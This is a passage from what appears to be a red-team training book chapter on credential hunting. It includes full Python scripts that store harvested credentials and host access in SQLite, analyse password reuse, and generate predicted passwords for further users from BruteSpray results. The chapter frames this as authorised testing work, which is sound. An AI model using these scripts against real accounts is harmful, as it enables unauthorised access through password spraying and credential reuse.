Beyond the basic tools, consider these advanced strategies for more effective credential management:

### 1. Credential Database Management

```bash
# Create a simple credential database in SQLite
cat > cred_database.py << 'EOF'
#!/usr/bin/env python3
import sqlite3
import sys
import os
import csv
import datetime

def create_database(db_path):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    
    # Create tables
    c.execute('''CREATE TABLE IF NOT EXISTS credentials (
                  id INTEGER PRIMARY KEY,
                  username TEXT,
                  password TEXT,
                  domain TEXT,
                  hash TEXT,
                  source TEXT,
                  discovered_date TEXT,
                  notes TEXT
               )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS hosts (
                  id INTEGER PRIMARY KEY,
                  hostname TEXT,
                  ip_address TEXT,
                  os TEXT,
                  description TEXT
               )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS access (
                  id INTEGER PRIMARY KEY,
                  credential_id INTEGER,
                  host_id INTEGER,
                  service TEXT,
                  port INTEGER,
                  last_verified TEXT,
                  status TEXT,
                  FOREIGN KEY (credential_id) REFERENCES credentials (id),
                  FOREIGN KEY (host_id) REFERENCES hosts (id)
               )''')
    
    conn.commit()
    conn.close()
    
    print(f"Database created at {db_path}")

def import_credentials(db_path, creds_file):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    count = 0
    
    with open(creds_file, 'r') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) >= 2:
                username = parts[0]
                password = ':'.join(parts[1:])
                
                # Check if credential already exists
                c.execute("SELECT id FROM credentials WHERE username = ? AND password = ?",
                         (username, password))
                result = c.fetchone()
                
                if not result:
                    c.execute("INSERT INTO credentials (username, password, discovered_date, source) VALUES (?, ?, ?, ?)",
                             (username, password, today, os.path.basename(creds_file)))
                    count += 1
    
    conn.commit()
    conn.close()
    
    print(f"Imported {count} new credentials from {creds_file}")

def import_hosts(db_path, hosts_file):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    
    count = 0
    
    with open(hosts_file, 'r') as f:
        for line in f:
            host = line.strip()
            if host and not host.startswith('#'):
                # Determine if it's an IP or hostname
                if all(c.isdigit() or c == '.' for c in host):
                    ip_address = host
                    hostname = ""
                else:
                    hostname = host
                    ip_address = ""
                
                # Check if host already exists
                c.execute("SELECT id FROM hosts WHERE hostname = ? OR ip_address = ?",
                         (hostname, ip_address))
                result = c.fetchone()
                
                if not result:
                    c.execute("INSERT INTO hosts (hostname, ip_address) VALUES (?, ?)",
                             (hostname, ip_address))
                    count += 1
    
    conn.commit()
    conn.close()
    
    print(f"Imported {count} new hosts from {hosts_file}")

def import_access(db_path, access_file):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    count = 0
    
    with open(access_file, 'r') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) >= 4:
                host = parts[0]
                service = parts[1]
                username = parts[2]
                password = parts[3]
                
                port = ""
                if "(" in service and ")" in service:
                    port_start = service.find("(") + 1
                    port_end = service.find(")")
                    port = service[port_start:port_end]
                
                # Look up credential and host IDs
                c.execute("SELECT id FROM credentials WHERE username = ? AND password = ?",
                         (username, password))
                cred_result = c.fetchone()
                
                c.execute("SELECT id FROM hosts WHERE hostname = ? OR ip_address = ?",
                         (host, host))
                host_result = c.fetchone()
                
                if cred_result and host_result:
                    cred_id = cred_result[0]
                    host_id = host_result[0]
                    
                    # Check if access already exists
                    c.execute("SELECT id FROM access WHERE credential_id = ? AND host_id = ? AND service = ?",
                             (cred_id, host_id, service))
                    access_result = c.fetchone()
                    
                    if not access_result:
                        c.execute("INSERT INTO access (credential_id, host_id, service, port, last_verified, status) VALUES (?, ?, ?, ?, ?, ?)",
                                 (cred_id, host_id, service, port, today, "Valid"))
                        count += 1
    
    conn.commit()
    conn.close()
    
    print(f"Imported {count} new access entries from {access_file}")

def export_report(db_path, output_file):
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    
    # Generate report
    with open(output_file, 'w') as f:
        f.write("# Credential Access Report\n")
        f.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        # Summary statistics
        c.execute("SELECT COUNT(*) FROM credentials")
        cred_count = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM hosts")
        host_count = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM access WHERE status = 'Valid'")
        access_count = c.fetchone()[0]
        
        f.write(f"## Summary\n")
        f.write(f"- Total credentials: {cred_count}\n")
        f.write(f"- Total hosts: {host_count}\n")
        f.write(f"- Valid access entries: {access_count}\n\n")
        
        # Access by service
        f.write("## Access by Service\n")
        c.execute("SELECT service, COUNT(*) as count FROM access GROUP BY service ORDER BY count DESC")
        for row in c.fetchall():
            f.write(f"- {row['service']}: {row['count']} entries\n")
        f.write("\n")
        
        # Detailed access information
        f.write("## Detailed Access Information\n\n")
        
        query = """
        SELECT h.hostname, h.ip_address, a.service, a.port, c.username, c.password, a.last_verified
        FROM access a
        JOIN credentials c ON a.credential_id = c.id
        JOIN hosts h ON a.host_id = h.id
        WHERE a.status = 'Valid'
        ORDER BY h.hostname, h.ip_address, a.service
        """
        
        c.execute(query)
        current_host = ""
        
        for row in c.fetchall():
            host_display = row['hostname'] if row['hostname'] else row['ip_address']
            
            if host_display != current_host:
                current_host = host_display
                f.write(f"### {current_host}\n\n")
                f.write("| Service | Port | Username | Password | Last Verified |\n")
                f.write("|---------|------|----------|----------|---------------|\n")
            
            f.write(f"| {row['service']} | {row['port']} | {row['username']} | {row['password']} | {row['last_verified']} |\n")
        
        f.write("\n")
    
    conn.close()
    
    print(f"Report exported to {output_file}")

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Create database: {} create <db_file>".format(sys.argv[0]))
        print("  Import credentials: {} import_creds <db_file> <creds_file>".format(sys.argv[0]))
        print("  Import hosts: {} import_hosts <db_file> <hosts_file>".format(sys.argv[0]))
        print("  Import access: {} import_access <db_file> <access_file>".format(sys.argv[0]))
        print("  Export report: {} report <db_file> <output_file>".format(sys.argv[0]))
        sys.exit(1)
    
    command = sys.argv[1]
    
    if command == "create" and len(sys.argv) >= 3:
        create_database(sys.argv[2])
    elif command == "import_creds" and len(sys.argv) >= 4:
        import_credentials(sys.argv[2], sys.argv[3])
    elif command == "import_hosts" and len(sys.argv) >= 4:
        import_hosts(sys.argv[2], sys.argv[3])
    elif command == "import_access" and len(sys.argv) >= 4:
        import_access(sys.argv[2], sys.argv[3])
    elif command == "report" and len(sys.argv) >= 4:
        export_report(sys.argv[2], sys.argv[3])
    else:
        print("Invalid command or missing arguments")
        sys.exit(1)

if __name__ == "__main__":
    main()
EOF

chmod +x cred_database.py

# Create and populate the credential database
./cred_database.py create creds.db
./cred_database.py import_creds creds.db brutespray_results_*/credentials/all_creds.txt
./cred_database.py import_hosts creds.db all_targets.txt
./cred_database.py import_access creds.db brutespray_results_*/credentials/all_creds.txt
./cred_database.py report creds.db credential_report.md
```

### 2. Password Reuse Analysis

```bash
# Create a script to analyze password reuse patterns
cat > password_reuse.py << 'EOF'
#!/usr/bin/env python3
import sys
import collections

def analyze_reuse(creds_file):
    usernames = {}
    passwords = {}
    password_patterns = {}
    
    with open(creds_file, 'r') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) >= 2:
                username = parts[0]
                password = ':'.join(parts[1:])
                
                # Track username-password associations
                if username not in usernames:
                    usernames[username] = []
                usernames[username].append(password)
                
                # Track password-username associations
                if password not in passwords:
                    passwords[password] = []
                passwords[password].append(username)
                
                # Extract password pattern
                pattern = ""
                for char in password:
                    if char.islower():
                        pattern += "a"
                    elif char.isupper():
                        pattern += "A"
                    elif char.isdigit():
                        pattern += "0"
                    else:
                        pattern += "#"
                
                if pattern not in password_patterns:
                    password_patterns[pattern] = []
                password_patterns[pattern].append(password)
    
    # Analyze username patterns
    print("\n=== Username Analysis ===")
    print(f"Total unique usernames: {len(usernames)}")
    
    users_multiple_passes = {u: p for u, p in usernames.items() if len(p) > 1}
    print(f"Usernames with multiple passwords: {len(users_multiple_passes)}")
    
    for username, passes in sorted(users_multiple_passes.items(), key=lambda x: len(x[1]), reverse=True)[:10]:
        print(f"\n{username}: {len(passes)} passwords")
        for p in passes:
            print(f"  - {p}")
    
    # Analyze password reuse
    print("\n=== Password Reuse Analysis ===")
    print(f"Total unique passwords: {len(passwords)}")
    
    reused_passwords = {p: u for p, u in passwords.items() if len(u) > 1}
    print(f"Reused passwords: {len(reused_passwords)}")
    
    for password, users in sorted(reused_passwords.items(), key=lambda x: len(x[1]), reverse=True)[:10]:
        print(f"\n'{password}': used by {len(users)} users")
        for u in users:
            print(f"  - {u}")
    
    # Analyze password patterns
    print("\n=== Password Pattern Analysis ===")
    print(f"Total unique patterns: {len(password_patterns)}")
    
    pattern_counts = {p: len(pwds) for p, pwds in password_patterns.items()}
    print("\nMost common patterns:")
    for pattern, count in sorted(pattern_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
        example = password_patterns[pattern][0]
        print(f"  - {pattern} ({count} passwords, e.g., '{example}')")
    
    # Look for seasonal or year-based patterns
    year_passwords = []
    for password in passwords:
        if any(year in password for year in ['2020', '2021', '2022', '2023']):
            year_passwords.append(password)
    
    print(f"\nPasswords containing years (2020-2023): {len(year_passwords)}")
    for pwd in sorted(year_passwords)[:10]:
        print(f"  - {pwd}")
    
    season_passwords = []
    seasons = ['spring', 'summer', 'fall', 'winter', 'autumn']
    for password in passwords:
        pwd_lower = password.lower()
        if any(season in pwd_lower for season in seasons):
            season_passwords.append(password)
    
    print(f"\nPasswords containing seasons: {len(season_passwords)}")
    for pwd in sorted(season_passwords):
        print(f"  - {pwd}")

def main():
    if len(sys.argv) < 2:
        print("Usage: {} <credentials_file>".format(sys.argv[0]))
        sys.exit(1)
    
    creds_file = sys.argv[1]
    analyze_reuse(creds_file)

if __name__ == "__main__":
    main()
EOF

chmod +x password_reuse.py

# Analyze password reuse patterns
./password_reuse.py brutespray_results_*/credentials/all_creds.txt > password_analysis.txt
```

### 3. Predictive Password Generation

Based on password analysis, create predictive patterns for related accounts:

```bash
# Create a script to generate predictive passwords
cat > predict_passwords.py << 'EOF'
#!/usr/bin/env python3
import sys
import re
import datetime

def load_credentials(creds_file):
    creds = []
    with open(creds_file, 'r') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) >= 2:
                username = parts[0]
                password = ':'.join(parts[1:])
                creds.append((username, password))
    return creds

def analyze_patterns(creds):
    patterns = {}
    
    # Analyze each password
    for username, password in creds:
        # Check for username in password
        if username.lower() in password.lower():
            pattern = "username"
            if pattern not in patterns:
                patterns[pattern] = []
            patterns[pattern].append((username, password))
        
        # Check for year patterns
        years = ['2020', '2021', '2022', '2023']
        for year in years:
            if year in password:
                base = password.replace(year, "YEAR")
                pattern = f"year:{base}"
                if pattern not in patterns:
                    patterns[pattern] = []
                patterns[pattern].append((username, password))
        
        # Check for season patterns
        seasons = ['Spring', 'Summer', 'Fall', 'Winter', 'Autumn']
        for season in seasons:
            if season.lower() in password.lower():
                base = re.sub(r'(?i)' + season, "SEASON", password)
                pattern = f"season:{base}"
                if pattern not in patterns:
                    patterns[pattern] = []
                patterns[pattern].append((username, password))
    
    return patterns

def generate_predictions(patterns, additional_users):
    predictions = []
    current_year = str(datetime.datetime.now().year)
    current_season = get_current_season()
    
    for user in additional_users:
        user_predictions = []
        
        # Apply username patterns
        if "username" in patterns:
            for _, password in patterns["username"]:
                # Try to identify how username was incorporated
                for original_user, pwd in patterns["username"]:
                    if original_user.lower() in pwd.lower():
                        # Replace the original username with new username
                        new_pwd = pwd.lower().replace(original_user.lower(), user.lower())
                        user_predictions.append(new_pwd)
                        
                        # Also try capitalized version
                        user_predictions.append(new_pwd.capitalize())
        
        # Apply year patterns
        for pattern, examples in patterns.items():
            if pattern.startswith("year:"):
                base = pattern.split(':', 1)[1]
                for year in [current_year, str(int(current_year)-1)]:
                    new_pwd = base.replace("YEAR", year)
                    user_predictions.append(new_pwd)
        
        # Apply season patterns
        for pattern, examples in patterns.items():
            if pattern.startswith("season:"):
                base = pattern.split(':', 1)[1]
                for season in [current_season, get_previous_season()]:
                    new_pwd = base.replace("SEASON", season)
                    user_predictions.append(new_pwd)
                    
                    # Also try lowercase and capitalized versions
                    user_predictions.append(new_pwd.lower())
                    user_predictions.append(new_pwd.capitalize())
        
        # Add some generic predictions based on username
        user_predictions.extend([
            user + current_year,
            user.capitalize() + current_year,
            user + current_year + "!",
            user.capitalize() + current_year + "!",
            user + "123",
            user.capitalize() + "123",
            user + "123!",
            user.capitalize() + "123!",
            "Welcome" + current_year,
            "Welcome" + current_year + "!",
            "Password" + current_year,
            "Password" + current_year + "!"
        ])
        
        # Remove duplicates
        user_predictions = list(set(user_predictions))
        
        for pwd in user_predictions:
            predictions.append((user, pwd))
    
    return predictions

def get_current_season():
    month = datetime.datetime.now().month
    if 3 <= month <= 5:
        return "Spring"
    elif 6 <= month <= 8:
        return "Summer"
    elif 9 <= month <= 11:
        return "Fall"
    else:
        return "Winter"

def get_previous_season():
    current = get_current_season()
    if current == "Spring":
        return "Winter"
    elif current == "Summer":
        return "Spring"
    elif current == "Fall":
        return "Summer"
    else:
        return "Fall"

def main():
    if len(sys.argv) < 3:
        print("Usage: {} <credentials_file> <additional_users_file> <output_file>".format(sys.argv[0]))
        sys.exit(1)
    
    creds_file = sys.argv[1]
    users_file = sys.argv[2]
    output_file = sys.argv[3]
    
    # Load known credentials
    creds = load_credentials(creds_file)
    print(f"Loaded {len(creds)} credentials from {creds_file}")
    
    # Analyze patterns
    patterns = analyze_patterns(creds)
    print(f"Identified {len(patterns)} password patterns")
    
    # Load additional users
    with open(users_file, 'r') as f:
        additional_users = [line.strip() for line in f if line.strip()]
    print(f"Loaded {len(additional_users)} additional users from {users_file}")
    
    # Generate predictions
    predictions = generate_predictions(patterns, additional_users)
    print(f"Generated {len(predictions)} password predictions")
    
    # Write predictions to file
    with open(output_file, 'w') as f:
        for username, password in predictions:
            f.write(f"{username}:{password}\n")
    
    print(f"Predictions saved to {output_file}")

if __name__ == "__main__":
    main()
EOF

chmod +x predict_passwords.py

# Create a list of additional users to test
cat > additional_users.txt << EOF
jdoe
adavis
mdavis
sjohnson
tsmith
EOF

# Generate predictive passwords
./predict_passwords.py brutespray_results_*/credentials/all_creds.txt additional_users.txt predicted_passwords.txt
```

## Conclusion

Credential hunting and management form a critical component of red team operations, bridging the gap between discovery, access, and exploitation phases. The tools covered in this chapter—CeWL, Crunch, CredNinja, and BruteSpray—represent different approaches to finding, generating, validating, and leveraging credentials throughout an engagement.

These tools demonstrate why credential-based attacks remain so effective: organizations struggle to implement consistent password policies, users create predictable patterns, and password reuse amplifies the impact of a single compromise. By understanding these tools and techniques, red teamers can efficiently discover and leverage credentials to demonstrate the real-world risks of weak authentication practices.

Remember that as a professional red teamer, your objective is to help organizations identify and address their security weaknesses. Always operate within the scope of your engagement and with proper authorization.

In the next chapter, we'll explore the MITRE ATT&CK framework and how to map the tools and techniques we've covered to specific Tactics, Techniques, and Procedures (TTPs).
